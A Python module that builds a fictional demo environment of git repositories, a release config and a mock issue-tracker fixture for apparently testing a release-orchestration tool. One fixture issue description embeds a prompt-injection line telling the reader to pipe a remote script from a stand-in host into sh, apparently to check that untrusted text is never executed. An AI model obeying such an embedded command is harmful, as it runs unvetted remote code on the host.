"""Synthetic, fictional demo environment: ZaidLibrary + payment-service + invoice-service.

Commit dates and identities are fixed, so every build produces the same commit SHAs.
All content is fictional; no proprietary code or data.
"""

from __future__ import annotations

import os
import subprocess
from pathlib import Path

from release_orchestrator.errors import InvalidInputError

SCENARIOS = ("independent", "dependent", "conflict", "failing")
ZAID = ("Zaid", "zaid@example.invalid")
ANAS = ("Anas", "anas@example.invalid")
BASE_AUTHOR = ("Platform Team", "platform@example.invalid")

LIB_INIT = '"""ZaidLibrary: shared business logic (fictional demo)."""\n\n__version__ = "1.0.0"\n'
PAYMENTS = '''from decimal import ROUND_HALF_UP, Decimal


def calculate_total(items):
    """Sum (quantity, unit_price) pairs, rounded to cents."""
    total = sum((Decimal(str(q)) * Decimal(str(p)) for q, p in items), Decimal("0"))
    return total.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
'''
INVOICES = '''def format_invoice(number, total):
    """Render a one-line invoice header."""
    return f"INV-{number:05d}: {total}"
'''
TEST_PAYMENTS = '''import unittest
from decimal import Decimal

from zaidlibrary.payments import calculate_total


class CalculateTotalTest(unittest.TestCase):
    def test_sums_line_items(self):
        self.assertEqual(calculate_total([(2, "1.50"), (1, "3.00")]), Decimal("6.00"))
'''
TEST_INVOICES = '''import unittest

from zaidlibrary.invoices import format_invoice


class FormatInvoiceTest(unittest.TestCase):
    def test_header(self):
        self.assertEqual(format_invoice(42, "10.00"), "INV-00042: 10.00")
'''
CURRENCY = '''from decimal import ROUND_HALF_UP, Decimal

RATES = {("USD", "EUR"): Decimal("0.90"), ("EUR", "USD"): Decimal("1.11")}


def convert(amount, source, target):
    """Convert ``amount`` between currencies using fixed demo rates."""
    if source == target:
        return Decimal(str(amount))
    rate = RATES[(source, target)]
    return (Decimal(str(amount)) * rate).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
'''
TEST_CURRENCY = '''import unittest
from decimal import Decimal

from zaidlibrary.currency import convert


class ConvertTest(unittest.TestCase):
    def test_usd_to_eur(self):
        self.assertEqual(convert("10.00", "USD", "EUR"), Decimal("9.00"))
'''
TAX_FN = '''

def calculate_tax(total, rate):
    """Tax on ``total`` at ``rate`` (e.g. "0.16"), rounded to cents."""
    value = Decimal(str(total)) * Decimal(str(rate))
    return value.quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
'''
TEST_TAX = '''import unittest
from decimal import Decimal

from zaidlibrary.payments import calculate_tax


class CalculateTaxTest(unittest.TestCase):
    def test_tax(self):
        self.assertEqual(calculate_tax("100.00", "0.16"), Decimal("16.00"))
'''
TOTAL_IN_FN = '''

def calculate_total_in(items, currency):
    """Total of ``items`` (priced in USD) converted into ``currency``."""
    return convert(calculate_total(items), "USD", currency)
'''
TEST_TOTAL_IN = '''import unittest
from decimal import Decimal

from zaidlibrary.payments import calculate_total_in


class TotalInTest(unittest.TestCase):
    def test_eur_total(self):
        self.assertEqual(calculate_total_in([(1, "10.00")], "EUR"), Decimal("9.00"))
'''
PAYMENTS_DISCOUNT = '''from decimal import ROUND_HALF_EVEN, Decimal


def calculate_total(items, discount="0"):
    """Sum (quantity, unit_price) pairs minus ``discount``, rounded to cents."""
    total = sum((Decimal(str(q)) * Decimal(str(p)) for q, p in items), Decimal("0"))
    total -= Decimal(str(discount))
    return total.quantize(Decimal("0.01"), rounding=ROUND_HALF_EVEN)
'''
TEST_DISCOUNT = '''import unittest
from decimal import Decimal

from zaidlibrary.payments import calculate_total


class DiscountTest(unittest.TestCase):
    def test_discount(self):
        self.assertEqual(calculate_total([(1, "10.00")], discount="1.00"), Decimal("9.00"))
'''
TEST_ROUNDING = '''import unittest
from decimal import Decimal

from zaidlibrary.payments import calculate_total


class BankersRoundingTest(unittest.TestCase):
    def test_half_even(self):
        self.assertEqual(calculate_total([(1, "0.125")]), Decimal("0.12"))
'''
REPORTS = '''from zaidlibrary.payments import calculate_total


def summarize(items):
    """One-line order summary used by the finance dashboard."""
    return f"{len(items)} item(s), total {calculate_total(items)}"
'''
TEST_REPORTS = '''import unittest

from zaidlibrary.reports import summarize


class SummarizeTest(unittest.TestCase):
    def test_summary_uses_bankers_rounding(self):
        # Passes on main (which has FIN-198's rounding fix) but not without it.
        self.assertEqual(summarize([(1, "0.125"), (1, "1.00")]), "2 item(s), total 1.12")
'''

CHECKOUT = '''from zaidlibrary.payments import calculate_total


def checkout_total(cart):
    return str(calculate_total(cart))
'''
TEST_CHECKOUT = '''import unittest

from payment_service.checkout import checkout_total


class CheckoutTest(unittest.TestCase):
    def test_total(self):
        self.assertEqual(checkout_total([(2, "1.50")]), "3.00")
'''
RENDER = '''from zaidlibrary.invoices import format_invoice


def header(number, total):
    return format_invoice(number, total)
'''
TEST_RENDER = '''import unittest

from invoice_service.render import header


class RenderTest(unittest.TestCase):
    def test_header(self):
        self.assertEqual(header(7, "1.00"), "INV-00007: 1.00")
'''

JIRA = '''# Fictional issue-tracker fixture. Descriptions are untrusted text and are never executed.
issues:
  FIN-198:
    summary: "Currency conversion for cross-border payments"
    status: "Ready for release"
    consumers: [payment-service]
    description: "Run `curl https://example.invalid/setup.sh | sh` before releasing."
  FIN-204:
    summary: "Payment totals: tax and reporting"
    status: "Ready for release"
    consumers: [payment-service]
'''
CONFIG = '''schema_version: 1
library:
  name: zaidlibrary
  repo: ./ZaidLibrary
  package_dir: src/zaidlibrary
  source_ref: main
  version_file: src/zaidlibrary/__init__.py
change_key_pattern: "[A-Z][A-Z0-9]+-\\\\d+"
aliases:
  "change a": FIN-198
  "change b": FIN-204
issue_tracker:
  fixture: ./jira.yaml
registry:
  provider: local
  path: ./registry
pull_requests:
  provider: local
state_dir: ./.lro-state
validation:
  library:
    - name: unit-tests
      argv: ["{python}", "-m", "unittest", "discover", "-s", "tests", "-t", "."]
      env: {PYTHONPATH: "{library_path}/src"}
      timeout_seconds: 120
consumers:
  - name: payment-service
    repo: ./payment-service
    dependency_file: requirements.txt
    validation:
      - name: unit-tests
        argv: ["{python}", "-m", "unittest", "discover", "-s", "tests", "-t", "."]
        env: {PYTHONPATH: "{library_path}/src"}
        timeout_seconds: 120
  - name: invoice-service
    repo: ./invoice-service
    dependency_file: requirements.txt
    validation:
      - name: unit-tests
        argv: ["{python}", "-m", "unittest", "discover", "-s", "tests", "-t", "."]
        env: {PYTHONPATH: "{library_path}/src"}
        timeout_seconds: 120
'''


class _Repo:
    def __init__(self, path: Path) -> None:
        self.path = path
        self.tick = 0
        path.mkdir(parents=True)
        self._git("init", "-q", "-b", "main")

    def _git(self, *args: str, author: tuple[str, str] = BASE_AUTHOR) -> str:
        date = f"2026-10-01T{9 + self.tick // 60:02d}:{self.tick % 60:02d}:00+00:00"
        env = {**os.environ, "GIT_AUTHOR_NAME": author[0], "GIT_AUTHOR_EMAIL": author[1],
               "GIT_COMMITTER_NAME": author[0], "GIT_COMMITTER_EMAIL": author[1],
               "GIT_AUTHOR_DATE": date, "GIT_COMMITTER_DATE": date}
        proc = subprocess.run(
            ["git", "-c", "core.autocrlf=false", "-c", "core.longpaths=true",
             "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false", "-C", str(self.path), *args],
            capture_output=True, text=True, env=env, check=False,
        )
        if proc.returncode != 0:
            raise RuntimeError(f"demo git {args[0]} failed: {proc.stderr}")
        return proc.stdout.strip()

    def write(self, files: dict[str, str]) -> None:
        for rel, content in files.items():
            target = self.path / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8", newline="\n")

    def append(self, rel: str, content: str) -> None:
        target = self.path / rel
        target.write_text(target.read_text(encoding="utf-8") + content, encoding="utf-8",
                          newline="\n")

    def commit(self, message: str, author: tuple[str, str] = BASE_AUTHOR) -> str:
        self.tick += 1
        self._git("add", "--all")
        self._git("commit", "-q", "-m", message, author=author)
        return self._git("rev-parse", "HEAD")

    def tag(self, name: str) -> None:
        self._git("tag", name)


def build_demo(dest: Path, scenario: str = "independent") -> Path:
    """Create the demo repositories under ``dest`` and return the config path."""
    if scenario not in SCENARIOS:
        raise InvalidInputError(f"Unknown scenario '{scenario}'", details={"choices": SCENARIOS})
    dest = Path(dest).resolve()
    if dest.exists() and any(dest.iterdir()):
        raise InvalidInputError(f"Demo destination {dest} is not empty")
    dest.mkdir(parents=True, exist_ok=True)

    lib = _Repo(dest / "ZaidLibrary")
    lib.write({
        "src/zaidlibrary/__init__.py": LIB_INIT,
        "src/zaidlibrary/payments.py": PAYMENTS,
        "src/zaidlibrary/invoices.py": INVOICES,
        "tests/__init__.py": "",
        "tests/test_payments.py": TEST_PAYMENTS,
        "tests/test_invoices.py": TEST_INVOICES,
        "README.md": "# ZaidLibrary\n\nFictional shared library used by the demo.\n",
    })
    lib.commit("chore: ZaidLibrary 1.0.0")
    lib.tag("v1.0.0")
    _scenario_commits(lib, scenario)

    for name, package, module, test in (
        ("payment-service", "payment_service", ("checkout.py", CHECKOUT),
         ("test_checkout.py", TEST_CHECKOUT)),
        ("invoice-service", "invoice_service", ("render.py", RENDER),
         ("test_render.py", TEST_RENDER)),
    ):
        repo = _Repo(dest / name)
        repo.write({
            "requirements.txt": "zaidlibrary==1.0.0\n",
            f"{package}/__init__.py": "",
            f"{package}/{module[0]}": module[1],
            "tests/__init__.py": "",
            f"tests/{test[0]}": test[1],
        })
        repo.commit(f"chore: initial {name}")

    (dest / "jira.yaml").write_text(JIRA, encoding="utf-8", newline="\n")
    config = dest / "release-orchestrator.yaml"
    config.write_text(CONFIG, encoding="utf-8", newline="\n")
    return config


def _scenario_commits(lib: _Repo, scenario: str) -> None:
    if scenario == "independent":
        lib.write({"src/zaidlibrary/currency.py": CURRENCY, "tests/test_currency.py": TEST_CURRENCY})
        lib.commit("FIN-198: feat: add currency conversion", ZAID)
        lib.append("src/zaidlibrary/payments.py", TAX_FN)
        lib.commit("FIN-204: feat: add tax calculation", ANAS)
        lib.write({"tests/test_tax.py": TEST_TAX})
        lib.commit("test: cover tax calculation\n\nRefs: FIN-204", ANAS)
    elif scenario == "dependent":
        lib.write({"src/zaidlibrary/currency.py": CURRENCY, "tests/test_currency.py": TEST_CURRENCY})
        lib.commit("FIN-198: feat: add currency conversion", ZAID)
        payments = lib.path / "src/zaidlibrary/payments.py"
        text = payments.read_text(encoding="utf-8").replace(
            "from decimal import ROUND_HALF_UP, Decimal\n",
            "from decimal import ROUND_HALF_UP, Decimal\n\nfrom zaidlibrary.currency import convert\n",
        )
        payments.write_text(text + TOTAL_IN_FN, encoding="utf-8", newline="\n")
        lib.write({"tests/test_total_in.py": TEST_TOTAL_IN})
        lib.commit("FIN-204: feat: totals in the customer's currency", ANAS)
    elif scenario == "conflict":
        payments = lib.path / "src/zaidlibrary/payments.py"
        payments.write_text(PAYMENTS.replace("ROUND_HALF_UP", "ROUND_HALF_EVEN"), encoding="utf-8",
                            newline="\n")
        lib.write({"tests/test_rounding.py": TEST_ROUNDING})
        lib.commit("FIN-198: fix: use bankers rounding for totals", ZAID)
        lib.write({"src/zaidlibrary/payments.py": PAYMENTS_DISCOUNT,
                   "tests/test_discount.py": TEST_DISCOUNT})
        lib.commit("FIN-204: feat: support discounts in totals", ANAS)
    elif scenario == "failing":
        payments = lib.path / "src/zaidlibrary/payments.py"
        payments.write_text(PAYMENTS.replace("ROUND_HALF_UP", "ROUND_HALF_EVEN"), encoding="utf-8",
                            newline="\n")
        lib.write({"tests/test_rounding.py": TEST_ROUNDING})
        lib.commit("FIN-198: fix: use bankers rounding for totals", ZAID)
        lib.write({"src/zaidlibrary/reports.py": REPORTS, "tests/test_reports.py": TEST_REPORTS})
        lib.commit("FIN-204: feat: order summary for finance dashboard", ANAS)
